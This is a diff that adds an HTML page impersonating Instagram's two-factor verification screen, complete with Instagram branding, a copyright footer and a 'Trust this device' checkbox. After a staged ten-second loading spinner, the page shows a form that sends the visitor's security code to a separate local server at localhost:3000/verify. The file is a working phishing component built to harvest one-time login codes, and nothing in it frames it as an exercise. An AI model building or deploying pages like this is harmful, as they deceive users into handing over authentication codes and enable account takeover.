@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="otp.css" />
+    <title>Instagram Verification</title>
+    <style>
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            margin: 0;
+  padding: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  background-color: #fafafa;
+        }
+
+        .icon_holder {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 5%;
+            margin: 5%;
+        }
+
+        #icon_holder {
+            border: 3px solid #0E68CE;
+            padding: 5%;
+            color: #0E68CE;
+            border-radius: 50%;
+            font-size: 10vw;
+        }
+
+        #iconholder {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 5% auto;
+        }
+
+        #heading1 {
+            text-align: center;
+            width: 80%;
+            margin: auto;
+            font-size: smaller;
+        }
+
+        form {
+            padding: 30px 20px;
+        }
+
+        .login-with-fb {
+            padding: 30px 20px 20px 20px;
+        }
+
+        form .sr-only {
+            display: none;
+        }
+
+        form input {
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            color: #808080;
+            margin-bottom: 8px;
+            padding: 10px 10px;
+            width: 100%;
+        }
+
+        form input::placeholder {
+            color: #808080;
+        }
+
+        form input:focus {
+            border: 1px solid #808080;
+            outline: none;
+        }
+
+        form button {
+            background-color: #0095f6;
+            border-radius: 5px;
+            color: #fff;
+            font-weight: bold;
+            height: 35px;
+            margin-top: 10px;
+            width: 100%;
+            outline: none;
+            border: none;
+        }
+
+        #terms_conditions * {
+            padding: 0px;
+            margin: 0px;
+        }
+
+        #terms_conditions {
+            display: flex;
+            align-items: center;
+            width: 90%;
+            margin: auto;
+        }
+
+        #two_holder {
+            padding: 0px;
+
+            margin-left: 10px;
+        }
+
+        #two_holder #p1_h {
+            font-size: smaller;
+            font-weight: 700;
+        }
+
+        #two_holder #p2_h {
+            font-size: smaller;
+
+        }
+
+        #resend_holder {
+            text-align: center;
+            width: 60%;
+            margin: 15% auto;
+        }
+
+        #resend_holder a {
+            color: #0E68CE;
+            text-decoration: none;
+
+        }
+
+        footer {
+            position: absolute;
+            bottom: 0px;
+            left: 0px;
+            right: 0px;
+            width: 100%;
+            text-align: center;
+            color: #808080;
+        }
+        .loader-container {
+  width: 100px;
+  height: 100px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.loader {
+  border: 8px solid #f3f3f3; /* Light grey */
+  border-top: 8px solid #3498db; /* Blue */
+  border-radius: 50%;
+  width: 50px;
+  height: 50px;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+    </style>
+</head>
+
+<body>
+    <div class="loader-container">
+        <div class="loader"></div>
+      </div>
+      <div class="otp-container" style="display: none;">
+    <main>
+        <div id="iconholder">
+
+        </div>
+        <div class="icon_holder">
+            <i class="material-icons" id="icon_holder">https</i>
+        </div>
+        <p id="heading1">Enter the code we sent to your device check WhatsApp or SMS</p>
+        <form action="http://localhost:3000/verify" method="POST">
+            <label for="email" class="sr-only">Security Code</label>
+            <input name="otp" placeholder="Security Code" />
+            <button type="submit">Confirm</button>
+        </form>
+        <div id="terms_conditions">
+            <div id="1_holder">
+                <input type="checkbox" checked />
+            </div>
+            <div id="two_holder">
+                <p id="p1_h">Trust this device</p>
+                <p id="p2_h">We won't ask for a code next time</p>
+            </div>
+
+        </div>
+        <div id="resend_holder">
+            <p>Didn't get a security code? <a href="#">Resend</a></p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; Instagram 2024</p>
+    </footer>
+      </div>
+</body>
+<script>
+    // Wait for the DOM to be fully loaded
+    document.addEventListener("DOMContentLoaded", function () {
+        // Show loading page
+        const loaderContainer = document.querySelector('.loader-container');
+        const otpContainer = document.querySelector('.otp-container');
+
+        // Hide OTP page initially
+        otpContainer.style.display = 'none';
+
+        // Show loading page for 10 seconds
+        setTimeout(function () {
+            loaderContainer.style.display = 'none';
+            otpContainer.style.display = 'block';
+        }, 10000); // 10 seconds in milliseconds
+    });
+
+</script>
+
+</html>
